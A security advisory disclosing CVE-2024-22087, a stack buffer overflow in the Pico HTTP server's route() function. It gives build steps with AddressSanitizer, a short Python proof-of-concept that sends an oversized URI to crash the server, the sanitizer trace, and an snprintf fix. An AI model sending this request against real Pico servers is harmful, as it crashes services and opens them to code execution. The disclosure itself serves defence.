### CVE-2024-22087

I discovered a remote stack buffer overflow vulnerability in the Pico HTTP server through commit f3b69a6 in the function void route() at main.c, line 81:

```
 GET(uri) { 
   char file_name[255]; 
   sprintf(file_name, "%s%s", PUBLIC_DIR, uri); 
```

Any project that utilizes pico is vulnerable to remote code execution.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself.

### Makefile Modifications

The following modifications were made to the Makefile to compile pico with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the stack buffer overflow vulnerability:

```
all: server

clean:
	@rm -rf *.o
	@rm -rf server

server: main.o httpd.o
	gcc -o server $^ -fsanitize=address -g

main.o: main.c httpd.h
	gcc -c -o main.o main.c -fsanitize=address -g

httpd.o: httpd.c httpd.h
	gcc -c -o httpd.o httpd.c -fsanitize=address -g

```

### Compiling Pico

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformed URI  (2,000,000 bytes long) to Pico and wait for a response:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8000))
sock.send(b"GET /"+b"C"*2000000+b"HTTP/1.1\r\nHost:localhost:8000\r\n\r\n")
response = sock.recv(4096)
sock.close()

```

### Starting Pico

```
./server
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==960119==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f214c10015f at pc 0x7f214e09215c bp 0x7ffe88c08220 sp 0x7ffe88c079e0
WRITE of size 65487 at 0x7f214c10015f thread T0                                                                                                                                 
    #0 0x7f214e09215b in __interceptor_vsprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1765
    #1 0x7f214e09233e in __interceptor_sprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1808
    #2 0x556476f2cd71 in route /home/kali/projects/fuzzing/pico/main.c:81
    #3 0x556476f2e336 in respond /home/kali/projects/fuzzing/pico/httpd.c:222
    #4 0x556476f2d199 in serve_forever /home/kali/projects/fuzzing/pico/httpd.c:67
    #5 0x556476f2c4d3 in main /home/kali/projects/fuzzing/pico/main.c:13
    #6 0x7f214de456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #7 0x7f214de45784 in __libc_start_main_impl ../csu/libc-start.c:360
    #8 0x556476f2c3b0 in _start (/home/kali/projects/fuzzing/pico/server+0x33b0) (BuildId: f62da5ef1f726838c2864638756f4930a324ceb6)

Address 0x7f214c10015f is located in stack of thread T0 at offset 351 in frame
    #0 0x556476f2c7e0 in route /home/kali/projects/fuzzing/pico/main.c:44

  This frame has 2 object(s):
    [32, 52) 'index_html' (line 48)
    [96, 351) 'file_name' (line 80) <== Memory access at offset 351 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1765 in __interceptor_vsprintf
Shadow bytes around the buggy address:
  0x7f214c0ffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c0fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c0fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100000: f1 f1 f1 f1 00 00 04 f2 f2 f2 f2 f2 00 00 00 00
  0x7f214c100080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7f214c100100: 00 00 00 00 00 00 00 00 00 00 00[07]f3 f3 f3 f3
  0x7f214c100180: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==960119==ABORTING

```

This error is caused by writing data that exceeds the allocated buffer size. In this case, the buffer 'file_name' defined in the route function with a size of 255 bytes is overflowing. The overflow is occurring in the sprintf call, where you concatenate PUBLIC_DIR with uri or other strings to form a file path. If the combined length of these strings exceeds 255 characters, it will overflow the file_name buffer.

### Mitigation

To quickly mitigate this vulnerability, replace sprintf with snprintf, which allows you to specify the maximum number of characters to be written, including the null terminator. This prevents the stack buffer overflow by truncating the string if it exceeds the specified length.

Buffer overflow vulnerability:

```
sprintf(file_name, "%s%s", PUBLIC_DIR, uri);
```

Modified code preventing a buffer overflow:

```
snprintf(file_name, sizeof(file_name), "%s%s", PUBLIC_DIR, uri);
```

### References

* https://cwe.mitre.org/data/definitions/121.html
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
* https://github.com/google/sanitizers/wiki/AddressSanitizer
* https://www.cve.org/CVERecord?id=CVE-2024-22087
